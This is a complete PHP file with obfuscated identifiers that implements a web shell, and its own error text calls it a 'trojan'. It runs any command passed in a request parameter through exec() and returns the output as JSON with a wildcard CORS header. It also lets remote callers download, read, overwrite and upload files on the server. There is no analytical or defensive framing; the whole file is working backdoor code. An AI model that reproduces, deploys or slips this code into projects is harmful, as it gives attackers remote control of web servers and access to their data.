<?php

class _0{
    private $_1         = '';
    private $_2             = '';
    private $_3        = array();
        private $_4      = array();
    private $_5        = array(
        'error'          => null,
        'output'         => null,
        'prompt_context' => null,
    );

    
    public function __construct(){
                if(isset($_SESSION['cwd'])){
            $this->_2 = $_SESSION['cwd'];
        } else {
            $this->_2 = trim(`pwd`);
        }
                $this->_5['prompt_context'] = $this->_6();
    }

    
    public function _7($_8){
                        if($_8['action'] == 'shell'){
            $this->_9($_8['cmd']);
        }

                else {
                        $_a = $_8['action'];

                        if(method_exists($this, $_a)){
                $this->$_a($_8['args']);
            }
                        else {
                $this->_5 = array(
                    'error'          => "wash error: the method $_a is not supported by the trojan.",
                    'output'         => "wash error: the method $_a is not supported by the trojan.",
                    'prompt_context' => $this->_b,
                );
                $this->_c();
            }
        }
    }

    
    private function _9($_1){
                        $this->_1 = $_1;

        

        $_1  = "cd {$this->_2}; $_1 2>&1; pwd";
        exec($_1, $this->_4);

                $this->_2 = array_pop($this->_4);
        $this->_5 = array(
            'output'         => join($this->_4, "\n"),
            'prompt_context' => $this->_6(),
        );

                $_SESSION['cwd'] = $this->_2;

                $this->_c();
    }

    
    private function _c(){
        
        header('Access-Control-Allow-Origin: *');

                $this->_5 = array(
            'error'          => $this->_5['error'],
            'output'         => $this->_5['output'],
            'prompt_context' => $this->_5['prompt_context'],
        );

                echo json_encode($this->_5);
        die();
    }

    
    private function _6(){
                $_d               =  trim(`whoami`);
        $_e             =  gethostname();
        $_f      =  ($_d ===  'root') ? '#' : '$' ;
        $this->_b =  "{$_d}@{$_e}:{$this->_2}{$_f}";
        return $this->_b;
    }




    
    public function payload_file_down($_g){
                $_h = $_g['file'];
        chdir($this->_2);
                if(file_exists($_h)){
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($_h));
            header('Content-Transfer-Encoding: binary');
                                                            readfile($_h);
        }
        
                else { echo "The requested file does not exist."; }
        die();
    }

    
    public function payload_file_read($_g){
                chdir($this->_2);

                if(!file_exists($_g['file'])){
            $this->_5 = array(
                'error'          => 'The specified file does not exist.',
                'prompt_context' => $this->_b,
            );
            $this->_c();
        }

                if(!is_readable($_g['file'])){
            $this->_5 = array(
                'error'          => 'The specified file is not readable.',
                'prompt_context' => $this->_b,
            );
            $this->_c();
        }

                $_i = array(
                        'output' => file_get_contents($_g['file']),
                        'file'   => realpath($_g['file']),

        );
        $this->_5 = array(
            'output'         => $_i,
            'prompt_context' => $this->_b,
        );
        $this->_c();
    }

    
    public function payload_file_up($_g){
        $_j = json_encode($_FILES);
        $_j = json_encode($_FILES);

                $this->_5 = array(
            'output'         => $_j,
            'prompt_context' => $this->_b,
        );

        $this->_c();
    }

    
    public function payload_file_write($_g){
                chdir($this->_2);

                if(!file_exists($_g['file'])){
            $this->_5 = array(
                'error'          => 'The specified file does not exist.',
                'prompt_context' => $this->_b,
            );
            $this->_c();
        }

                if(!is_writeable($_g['file'])){
            $this->_5 = array(
                'error'          => 'The specified file is not writeable.',
                'prompt_context' => $this->_b,
            );
            $this->_c();
        }

                $_k = file_put_contents($_g['file'], $_g['data']);

                if($_k === false){
            $this->_5 = array(
                'error'          => 'Failed to write file.',
                'prompt_context' => $this->_b,
            );
        }
        else {
            $this->_5 = array(
                'output'         => 'File written successfully.',
                'prompt_context' => $this->_b,
            );
        }
        $this->_c();
    }

    
    public function payload_image_view($_g){
                $_h = $_g['file'];
        chdir($this->_2);

                if(file_exists($_h)){
                        $_l = getimagesize($_h);
            header("Content-Type: {$_l['mime']}");
                                                            readfile($_h);
        }
        
                else { echo "The requested file does not exist."; }
        die();
    }
}


session_start();
$_m = new _0();
$_m->_7($_REQUEST);
